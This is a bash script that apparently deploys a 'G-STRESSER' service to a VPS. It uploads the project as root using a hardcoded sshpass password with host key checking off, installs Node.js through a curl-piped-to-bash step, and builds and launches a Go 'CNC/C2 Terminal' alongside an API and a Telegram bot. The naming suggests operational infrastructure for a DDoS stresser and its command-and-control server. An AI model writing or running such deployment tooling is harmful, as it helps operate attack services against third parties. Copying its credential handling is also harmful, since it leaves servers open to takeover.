#!/bin/bash

# --- CONFIGURATION ---
DEFAULT_PASS="xxx"
DEFAULT_USER="root"
PORT=8880
REMOTE_DIR="/root/api"
ZIP_FILE="/tmp/api_deploy.zip"

# Check if IP is provided
if [ -z "$1" ]; then
    echo "Usage: ./deploy.sh [VPS_IP]"
    echo "Example: ./deploy.sh 103.77.246.xxx"
    exit 1
fi

IP=$1

echo "--------------------------------------------------------"
echo " DEPLOYING @ZzTLINHzZ API TO $IP"
echo "--------------------------------------------------------"

# 1. Zip local files
echo " Packaging API files (excluding heavy folders)..."
rm -f $ZIP_FILE
zip -r $ZIP_FILE . -x "node_modules/*" ".git/*" "logs/*" "*.log" "mobile_app/*" "build/*" ".gemini/*" "*/node_modules/*" "*/build/*" "*/.git/*" > /dev/null

# 2. Upload to VPS
echo " Transferring package to $IP..."
sshpass -p "$DEFAULT_PASS" scp -o StrictHostKeyChecking=no $ZIP_FILE $DEFAULT_USER@$IP:/root/api_deploy.zip

if [ $? -ne 0 ]; then
    echo " Upload failed! Check your connection or VPS IP."
    exit 1
fi

# 3. Remote Setup and Execute
echo " Setting up remote environment and starting server..."
sshpass -p "$DEFAULT_PASS" ssh -o StrictHostKeyChecking=no $DEFAULT_USER@$IP << EOF
    # Ensure dependencies are installed
    if ! command -v node &> /dev/null; then
        echo "Installing Node.js..."
        curl -fsSL https://deb.nodesource.com/setup_18.x | bash -
        apt-get install -y nodejs unzip screen
    fi

    # Ensure Go is installed for CNC
    if ! command -v go &> /dev/null; then
        echo "Installing Go..."
        apt-get update
        apt-get install -y golang-go
    fi

    # Kill existing processes BEFORE building/extracting to avoid "text file busy"
    echo " Stopping existing processes..."
    screen -S api_server -X quit 2>/dev/null
    screen -S tg_bot -X quit 2>/dev/null
    screen -S cnc_server -X quit 2>/dev/null
    pkill -f "node src/server.js" 2>/dev/null
    pkill -f "node bot.js" 2>/dev/null
    pkill -f "./cnc" 2>/dev/null
    sleep 2

    # Create directory and extract
    mkdir -p $REMOTE_DIR
    unzip -o /root/api_deploy.zip -d $REMOTE_DIR
    cd $REMOTE_DIR

    # Install npm packages
    echo " Installing NPM dependencies..."
    npm install --production

    # Build CNC/C2 Terminal
    echo " Building C2 Terminal..."
    cd cnc
    go build -o cnc .
    cd ..

    # Start new sessions
    echo " Starting G-STRESSER API..."
    screen -S api_server -dm bash -c "npm start"
    
    echo " Starting G-STRESSER CNC..."
    cd cnc
    screen -S cnc_server -dm bash -c "./cnc"
    cd ..

    echo " Remote deployment finished successfully!"
EOF

echo "--------------------------------------------------------"
echo " DEPLOYMENT COMPLETE!"
echo " Access your API at: http://$IP:$PORT"
echo "--------------------------------------------------------"
